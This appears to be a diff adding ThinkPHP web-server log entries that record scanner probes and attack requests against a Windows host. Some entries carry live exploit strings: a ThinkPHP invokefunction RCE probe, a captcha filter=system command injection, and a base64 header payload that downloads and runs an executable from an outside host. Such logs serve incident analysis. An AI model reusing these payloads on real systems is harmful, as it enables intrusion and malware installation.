+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000330s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/public/index.php
+[运行时间：0.019308s] [吞吐率：51.79req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001153s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001187s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'public',
+    2 => 'index.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000216s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/index.php
+[运行时间：0.012255s] [吞吐率：81.60req/s] [内存消耗：333.13kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000910s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000943s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000209s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/thinkphp/html/public/index.php
+[运行时间：0.012954s] [吞吐率：77.20req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000973s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001005s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'thinkphp',
+    1 => 'html',
+    2 => 'public',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000210s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/html/public/index.php
+[运行时间：0.012581s] [吞吐率：79.49req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000918s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000951s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'html',
+    1 => 'public',
+    2 => 'index.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/public/index.php
+[运行时间：0.012399s] [吞吐率：80.65req/s] [内存消耗：333.16kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000931s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000963s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'index.php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/TP/html/public/index.php
+[运行时间：0.012581s] [吞吐率：79.48req/s] [内存消耗：333.16kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000077s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000922s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000954s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'html',
+    2 => 'public',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000207s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/elrekt.php
+[运行时间：0.013407s] [吞吐率：74.59req/s] [内存消耗：333.06kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001031s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001064s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'elrekt.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/index.php
+[运行时间：0.018645s] [吞吐率：53.63req/s] [内存消耗：472.21kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000054s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000960s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000994s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000854s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000322s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 GET 114.115.146.220/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+[运行时间：0.010749s] [吞吐率：93.03req/s] [内存消耗：341.96kb] [文件加载：118]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000676s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000709s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'phpinfo',
+    1 => 
+    array (
+      0 => '1',
+    ),
+  ),
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000197s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:47+08:00 ] 49.232.13.96 POST 114.115.146.220/index.php?s=captcha
+[运行时间：0.009814s] [吞吐率：101.90req/s] [内存消耗：333.96kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000674s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000706s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Go-http-client/1.1',
+  'content-length' => '84',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 
+  array (
+    0 => 'system',
+  ),
+  'method' => 'get',
+  'server' => 
+  array (
+    'REQUEST_METHOD' => 'uname',
+  ),
+  'ipconfig' => '',
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000194s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T07:03:48+08:00 ] 49.232.13.96 GET 114.115.146.220:80/
+[运行时间：0.014915s] [吞吐率：67.05req/s] [内存消耗：472.16kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000050s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000668s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000699s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000813s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000297s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T09:31:11+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
+[运行时间：0.021420s] [吞吐率：46.69req/s] [内存消耗：332.79kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001071s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001105s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T09:33:58+08:00 ] 177.95.215.214 GET 114.115.146.220:80/
+[运行时间：0.025250s] [吞吐率：39.60req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001089s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001124s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000878s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T09:41:43+08:00 ] 103.113.106.18 GET 114.115.146.220:80/
+[运行时间：0.025006s] [吞吐率：39.99req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001166s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001200s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000874s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000229s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T10:51:31+08:00 ] 5.190.97.233 GET 114.115.146.220:80/
+[运行时间：0.023897s] [吞吐率：41.85req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001021s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001055s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000833s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000359s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000234s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T12:03:19+08:00 ] 201.69.50.136 GET 114.115.146.220:80/
+[运行时间：0.036536s] [吞吐率：27.37req/s] [内存消耗：472.14kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000092s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001733s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001788s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001283s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T12:39:08+08:00 ] 47.94.136.241 GET 114.115.146.220/TP/public/index.php
+[运行时间：0.023218s] [吞吐率：43.07req/s] [内存消耗：333.20kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001201s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001243s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'TP',
+    1 => 'public',
+    2 => 'index.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000237s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T13:40:12+08:00 ] 159.203.201.255 GET 114.115.146.220/manager/text/list
+[运行时间：0.018677s] [吞吐率：53.54req/s] [内存消耗：332.84kb] [文件加载：117]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001018s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001052s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'manager',
+    1 => 'text',
+    2 => 'list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '114.115.146.220',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T15:19:11+08:00 ] 116.62.174.255 GET 114.115.146.220/
+[运行时间：0.026795s] [吞吐率：37.32req/s] [内存消耗：473.74kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001183s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001217s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmsub3BlbnlvdXJhc3MuaWN1L2Rvd25sb2FkLmV4ZSAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUgJiAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://114.115.146.220:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '114.115.146.220',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000906s ]
+[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000356s ]
+[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-12-01T15:19:11+08:00 ] 116.62.174.255 GET 114.115.146.220/index.php
+[运行时间：0.014204s] [吞吐率：70.40req/s] [内存消耗：473.80kb] [文件加载：129]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000736s ]
+[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmsub3BlbnlvdXJhc3MuaWN1L2Rvd25sb2FkLmV4ZSAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUgJiAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-language' => 'zh-cn',
